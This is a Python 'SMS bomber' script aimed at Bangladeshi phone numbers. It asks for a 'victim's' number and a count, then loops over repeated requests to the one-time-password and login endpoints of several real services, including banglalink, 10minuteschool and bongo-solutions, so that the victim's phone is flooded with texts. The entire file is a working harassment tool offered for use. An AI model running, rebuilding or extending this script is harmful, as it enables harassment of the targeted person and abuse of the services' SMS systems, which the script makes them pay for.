import requests
import time
import sys
import os
bgreen="\033[1;32m"       # Green
bblack="\033[1;30m"       # Black
bred="\033[1;31m"         # Red
bgreen="\033[1;32m"       # Green
byellow="\033[1;33m"      # Yellow
bblue="\033[1;34m"        # Blue
bpurple="\033[1;35m"      # Purple
bcyan="\033[1;36m"        # Cyan
bwhite="\033[1;37m"       # White
os.system("clear")
logo=byellow+str("""

$$$$$$$$\          $$\                 
\____$$  |         $$ |                
    $$  /$$\   $$\ $$$$$$$\   $$$$$$\  
   $$  / $$ |  $$ |$$  __$$\ $$  __$$\ 
  $$  /  $$ |  $$ |$$ |  $$ |$$ /  $$ |
 $$  /   $$ |  $$ |$$ |  $$ |$$ |  $$ |
$$$$$$$$\\$$$$$$  |$$$$$$$  |\$$$$$$  |
\________|\______/ \_______/  \______/ 
                                       

$$$$$$$\                
$$  __$$\               
$$ |  $$ | $$$$$$\  $$\ 
$$$$$$$  | \____$$\ \__|
$$  __$$<  $$$$$$$ |$$\ 
$$ |  $$ |$$  __$$ |$$ |
$$ |  $$ |\$$$$$$$ |$$ |
\__|  \__| \_______|$$ |
              $$\   $$ |
              \$$$$$$  |
               \______/ 
                                       
                                       

=================================================================
     ★★★ [✓] Devoloper : Zuboraj ★★★       
=================================================================
==================================================================
	★★★Sms Bomber for Bangladesh★★★


""")
import requests

print(logo)
number=str(input(bpurple+" [✓] [Enter The Victim's Number :]> +880"+bblue))
amount=int(input(bgreen+" [✓] [Enter The Sms Amount : ]>"+bcyan))
#get
api="https://stage.bioscopelive.com/en/login/send-otp?phone=880"+number+"&operator=bd-otp"

#post
url="https://api.10minuteschool.com/lms-auth-service/api/v4/auth/userExists"
data={"contact":"+880"+number+"","type":"phone"}

#post
uru="https://api.10minuteschool.com/lms-auth-service/api/v4/auth/userExists"

dara={"contact":"+880"+number+"","type":"phone"}


#post
uri="https://developer.quizgiri.xyz/api/v2.0/send-otp"

dati={"phone":""+number+"","country_code":"+880","fcm_token":"null"}

#post
url1="https://auth.dhamakashopping.com/api/otp"

data1={"phoneNumber":"+880"+number+""}


#post
url2="https://assetliteapi.banglalink.net/api/v1/user/otp-login/request"

data2={"mobile":"0"+number+""}

#post
url3="https://www.walcart.com/easylogin/account/mobilecheck/"


data3="mobile=0"+number+"5&is_login=true&forgetpass=false"




#post
api01="https://api.bongo-solutions.com/auth/api/login/send-otp"

data01={"operator":"all","msisdn":"880"+number+""}

animation = [bred+"[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]",]

for i in range(50):
    time.sleep(0.1)
    sys.stdout.write("\rrequesting.... " + animation[i % len(animation)])
    sys.stdout.flush()
    
for i in range(amount):
	requests.get(api)
	requests.post(url,data=data)
	requests.post(uru,data=dara)
	requests.post(uri,data=dati)
	requests.post(api01,data=data01)
	requests.post(url1,data=data1)
	requests.post(url2,data=data2)
	requests.post(url3,data=data3)
	print(bgreen+str(i+1)+"[✓] ★★Zubo-Raj★★=>SMS SENT  ")